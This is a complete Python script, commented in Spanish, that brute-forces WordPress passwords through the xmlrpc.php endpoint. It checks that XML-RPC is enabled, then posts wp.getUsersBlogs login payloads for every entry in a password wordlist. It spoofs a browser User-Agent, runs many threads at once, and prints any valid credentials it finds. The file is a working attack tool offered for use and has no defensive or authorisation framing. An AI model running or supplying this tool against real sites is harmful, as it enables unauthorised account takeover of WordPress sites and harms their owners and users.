#!/usr/bin/python3
# coding: utf-8
"""
Script para realizar ataques de fuerza bruta a WordPress mediante XML-RPC
Autor: lxbx
"""

import requests
import sys
import argparse
import time
import concurrent.futures
from colorama import init, Fore, Style
from urllib.parse import urlparse

# Inicializar colorama para colores en la terminal
init(autoreset=True)

# Banner del script
BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
{Fore.CYAN}║ {Fore.GREEN}WordPress XML-RPC Bruteforce Tool                         {Fore.CYAN}║
{Fore.CYAN}║ {Fore.YELLOW}Versión mejorada                                         {Fore.CYAN}║
{Fore.CYAN}╚══════════════════════════════════════════════════════════╝
"""

def parse_arguments():
    """Configurar y procesar los argumentos de línea de comandos"""
    parser = argparse.ArgumentParser(description="WordPress XML-RPC Brute Force Tool")
    
    parser.add_argument("-u", "--user", help="Nombre de usuario de WordPress", required=False)
    parser.add_argument("-w", "--wordlist", help="Ruta al diccionario de contraseñas", required=False)
    parser.add_argument("-U", "--url", help="URL del servidor WordPress (incluir http:// o https://)", required=False)
    parser.add_argument("-t", "--threads", help="Número de hilos (default: 1)", type=int, default=1)
    parser.add_argument("-d", "--delay", help="Retardo entre intentos (segundos, default: 1)", type=float, default=1)
    parser.add_argument("-v", "--verbose", help="Modo detallado", action="store_true")
    
    return parser.parse_args()

def check_url(url):
    """Verifica y formatea correctamente la URL"""
    if not url.startswith(('http://', 'https://')):
        return f"http://{url}"
    
    # Asegurarse de que la URL termine con xmlrpc.php
    parsed_url = urlparse(url)
    path = parsed_url.path
    
    if not path:
        url = f"{url}/xmlrpc.php"
    elif not path.endswith('xmlrpc.php'):
        if path.endswith('/'):
            url = f"{url}xmlrpc.php"
        else:
            url = f"{url}/xmlrpc.php"
            
    return url

def test_xmlrpc(url):
    """Verifica si xmlrpc.php está habilitado en el sitio"""
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 405 and "XML-RPC server accepts POST requests only" in response.text:
            return True
        else:
            print(f"{Fore.RED}[!] Error: {url} no parece ser un endpoint XML-RPC válido")
            return False
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Error al conectar con {url}: {e}")
        return False

def create_xml_payload(username, password):
    """Crea el payload XML para la autenticación"""
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
    <methodName>wp.getUsersBlogs</methodName> 
    <params>
        <param><value>{username}</value></param>
        <param><value>{password}</value></param>
    </params>
</methodCall>'''

def try_password(url, username, password, verbose=False):
    """Intenta autenticarse con un usuario y contraseña específicos"""
    xml_payload = create_xml_payload(username, password)
    
    try:
        headers = {
            'Content-Type': 'application/xml',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'
        }
        
        response = requests.post(url, data=xml_payload, headers=headers, timeout=10)
        
        # Comprobar si la autenticación fue exitosa
        if "faultCode" not in response.text and "Incorrect username or password" not in response.text:
            print(f"{Fore.GREEN}[+] {Fore.YELLOW}¡ÉXITO! {Fore.GREEN}Credenciales válidas: {Fore.CYAN}{username}{Fore.WHITE}:{Fore.MAGENTA}{password}")
            return True
        else:
            if verbose:
                print(f"{Fore.RED}[-] Intento fallido: {Fore.CYAN}{username}{Fore.WHITE}:{Fore.MAGENTA}{password}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Error en la solicitud: {e}")
        return False

def brute_force(url, username, wordlist, threads=1, delay=1, verbose=False):
    """Función principal para realizar el ataque de fuerza bruta"""
    print(f"{Fore.YELLOW}[*] Iniciando ataque de fuerza bruta:")
    print(f"{Fore.YELLOW}[*] URL: {Fore.CYAN}{url}")
    print(f"{Fore.YELLOW}[*] Usuario: {Fore.CYAN}{username}")
    print(f"{Fore.YELLOW}[*] Diccionario: {Fore.CYAN}{wordlist}")
    print(f"{Fore.YELLOW}[*] Threads: {Fore.CYAN}{threads}")
    print(f"{Fore.YELLOW}[*] Delay: {Fore.CYAN}{delay} segundos")
    print(f"\n{Fore.YELLOW}[*] Cargando diccionario y preparando ataque...\n")
    
    try:
        # Verificar si el archivo existe y cargarlo en memoria
        with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [password.strip() for password in f.readlines()]
            
        print(f"{Fore.YELLOW}[*] Se cargaron {Fore.CYAN}{len(passwords)}{Fore.YELLOW} contraseñas del diccionario")
        
        # Contador para mostrar progreso
        total_passwords = len(passwords)
        tested_passwords = 0
        start_time = time.time()
        
        success = False

        # Multithreading para acelerar el proceso
        if threads > 1:
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                future_to_password = {executor.submit(try_password, url, username, password, verbose): password for password in passwords}
                
                for future in concurrent.futures.as_completed(future_to_password):
                    password = future_to_password[future]
                    tested_passwords += 1
                    
                    # Mostrar progreso
                    if tested_passwords % 10 == 0 or tested_passwords == total_passwords:
                        elapsed_time = time.time() - start_time
                        progress = (tested_passwords / total_passwords) * 100
                        passwords_per_second = tested_passwords / elapsed_time if elapsed_time > 0 else 0
                        
                        print(f"{Fore.YELLOW}[*] Progreso: {Fore.CYAN}{tested_passwords}/{total_passwords} {Fore.GREEN}({progress:.2f}%) {Fore.YELLOW}| {Fore.MAGENTA}{passwords_per_second:.2f} {Fore.YELLOW}contraseñas/segundo", end='\r')
                        
                    if future.result():  # Si encontramos la contraseña correcta
                        success = True
                        break
                        
                    time.sleep(delay)  # Añadir retardo entre intentos
        else:
            # Versión single-thread
            for password in passwords:
                tested_passwords += 1
                
                # Mostrar progreso
                if tested_passwords % 10 == 0 or tested_passwords == total_passwords:
                    elapsed_time = time.time() - start_time
                    progress = (tested_passwords / total_passwords) * 100
                    passwords_per_second = tested_passwords / elapsed_time if elapsed_time > 0 else 0
                    
                    print(f"{Fore.YELLOW}[*] Progreso: {Fore.CYAN}{tested_passwords}/{total_passwords} {Fore.GREEN}({progress:.2f}%) {Fore.YELLOW}| {Fore.MAGENTA}{passwords_per_second:.2f} {Fore.YELLOW}contraseñas/segundo", end='\r')
                
                if try_password(url, username, password, verbose):
                    success = True
                    break
                    
                time.sleep(delay)  # Añadir retardo entre intentos
        
        print("\n")  # Nueva línea después de la barra de progreso
        
        # Resumen final
        elapsed_time = time.time() - start_time
        print(f"\n{Fore.YELLOW}[*] Ataque finalizado en {Fore.CYAN}{elapsed_time:.2f} {Fore.YELLOW}segundos")
        print(f"{Fore.YELLOW}[*] Contraseñas probadas: {Fore.CYAN}{tested_passwords}/{total_passwords}")
        
        if not success:
            print(f"{Fore.RED}[!] No se encontraron credenciales válidas para el usuario {Fore.CYAN}{username}")
            
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Error: Archivo {wordlist} no encontrado")
        return False
    except Exception as e:
        print(f"{Fore.RED}[!] Error inesperado: {e}")
        return False

def main():
    """Función principal del script"""
    print(BANNER)
    
    args = parse_arguments()
    
    # Si no se proporcionan argumentos, solicitar entrada interactiva
    if not (args.user and args.wordlist and args.url):
        print(f"{Fore.YELLOW}[*] Modo interactivo:\n")
        
        if not args.url:
            args.url = input(f"{Fore.CYAN}[?] URL del servidor WordPress: {Style.RESET_ALL}")
        
        if not args.user:
            args.user = input(f"{Fore.CYAN}[?] Nombre de usuario: {Style.RESET_ALL}")
            
        if not args.wordlist:
            args.wordlist = input(f"{Fore.CYAN}[?] Ruta al diccionario de contraseñas: {Style.RESET_ALL}")
            
        # Opcional: preguntar por threads y delay en modo interactivo
        if input(f"{Fore.CYAN}[?] ¿Desea configurar opciones avanzadas? (s/N): {Style.RESET_ALL}").lower() == 's':
            try:
                threads_input = input(f"{Fore.CYAN}[?] Número de hilos (default: 1): {Style.RESET_ALL}")
                if threads_input:
                    args.threads = int(threads_input)
                    
                delay_input = input(f"{Fore.CYAN}[?] Retardo entre intentos en segundos (default: 1): {Style.RESET_ALL}")
                if delay_input:
                    args.delay = float(delay_input)
                    
                args.verbose = input(f"{Fore.CYAN}[?] Modo detallado (s/N): {Style.RESET_ALL}").lower() == 's'
            except ValueError:
                print(f"{Fore.RED}[!] Valor inválido, usando valores predeterminados")
                
    # Verificar y formatear la URL
    args.url = check_url(args.url)
    
    print(f"\n{Fore.YELLOW}[*] Verificando endpoint XML-RPC: {args.url}")
    
    # Verificar que el endpoint XML-RPC esté disponible
    if test_xmlrpc(args.url):
        print(f"{Fore.GREEN}[+] XML-RPC está habilitado en: {args.url}")
        brute_force(args.url, args.user, args.wordlist, args.threads, args.delay, args.verbose)
    else:
        print(f"{Fore.RED}[!] No se pudo acceder al endpoint XML-RPC. Verifique la URL o si XML-RPC está habilitado en el sitio.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Ataque interrumpido por el usuario")
        sys.exit(0)
